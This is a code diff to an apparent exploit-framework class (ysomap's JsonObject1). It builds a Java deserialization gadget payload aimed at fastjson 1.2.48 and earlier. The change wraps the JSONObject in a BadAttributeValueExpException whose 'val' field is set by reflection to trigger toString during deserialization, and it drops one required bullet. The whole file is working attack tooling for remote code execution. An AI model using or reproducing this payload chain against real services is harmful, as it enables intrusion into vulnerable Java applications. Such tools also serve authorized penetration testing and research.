@@ -7,6 +7,10 @@ import ysomap.common.annotation.*;
 import ysomap.core.util.PayloadHelper;
 import ysomap.payloads.AbstractPayload;
 
+import javax.management.BadAttributeValueExpException;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+
 /**
  * @author wh1t3p1g
  * @since 2022/9/5
@@ -15,7 +19,7 @@ import ysomap.payloads.AbstractPayload;
 @SuppressWarnings({"rawtypes"})
 @Authors({ Authors.WH1T3P1G })
 @Targets({Targets.JDK, Targets.JNDI})
-@Require(bullets = {"LdapAttributeBullet", "JdbcRowSetImplBullet", "TemplatesImplBullet"}, param = false)
+@Require(bullets = {"LdapAttributeBullet", "TemplatesImplBullet"}, param = false)
 @Dependencies({"fastjson<=1.2.48"})
 public class JsonObject1 extends AbstractPayload<Object> {
 
@@ -26,8 +30,12 @@ public class JsonObject1 extends AbstractPayload<Object> {
 
     @Override
     public Object pack(Object obj) throws Exception {
-        JSONObject map = new JSONObject();
-        map.put("ysomap", obj);
-        return PayloadHelper.makeReadObjectToStringTrigger(map);
+        JSONObject json = new JSONObject();
+        json.put("ysomap", obj);
+        BadAttributeValueExpException poc = new BadAttributeValueExpException(1);
+        Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
+        val.setAccessible(true);
+        val.set(poc,json);
+        return PayloadHelper.makeReadObjectToStringTrigger(poc);
     }
 }
